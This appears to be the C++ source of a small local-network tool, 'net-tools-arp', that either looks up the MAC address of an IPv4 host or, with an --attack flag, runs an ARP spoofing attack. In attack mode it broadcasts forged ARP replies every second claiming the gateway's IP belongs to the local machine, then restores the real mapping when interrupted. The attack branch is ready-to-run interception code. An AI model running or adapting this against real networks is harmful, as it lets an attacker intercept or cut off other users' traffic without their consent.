#include "../driver.h"
#include <signal.h>
#include <argparse/argparse.hpp>

std::atomic<bool> end_attack = false;

void onInterrupt(int) { end_attack = true; }

int main(int argc, char** argv)
{
    argparse::ArgumentParser prog("net-tools-arp");
    prog.add_argument("ip").required().help("ip4 address");
    prog.add_argument("-a", "--attack")
        .default_value(false)
        .implicit_value(true)
        .help("mobilize arp attack");

    try {
        prog.parse_args(argc, argv);
    } catch (std::exception const& err) {
        ELOG("{}\n", err.what());
        std::cerr << prog;
        std::exit(1);
    }

    MY_TRY;
    utils::initLogger(argv[0]);
    auto ip = net::Ip4::fromDottedDec(prog.get<std::string>("ip"));
    net::Driver driver(ip);
    if (!prog.get<bool>("--attack")) {
        auto mac = driver.getMac(ip);
        if (!mac) {
            if (mac.error().timeout()) {
                ILOG("{} is offline", ip.toStr());
            } else {
                ELOG(mac.error().what());
            }
        } else {
            ILOG("{} is at {}", ip.toStr(), (*mac).toStr());
        }

    } else {
        signal(SIGINT, onInterrupt);
        auto& apt = driver.getAdaptor();
        if (auto gateway_mac = driver.getMac(apt.gateway)) {
            ILOG("gateway {} is at {}", apt.gateway.toStr(), gateway_mac->toStr());
        } else {
            ELOG(gateway_mac.error().what());
            return 1;
        }
        ILOG("pretending gateway's mac to {}...", apt.mac.toStr());
        auto lie = driver.broadcastedARP(apt.mac, apt.gateway, apt.mac, apt.ip, true);
        while (!end_attack) {
            driver.send(lie);
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        ILOG("attack stopped");
        if (auto gateway_mac = driver.getMac(apt.gateway)) {
            auto truth = driver.broadcastedARP(*gateway_mac, apt.gateway, apt.mac, apt.ip, true);
            driver.send(truth);
            ILOG("gateway's mac restored to {}", gateway_mac->toStr());
        }
    }
    MY_CATCH;
}
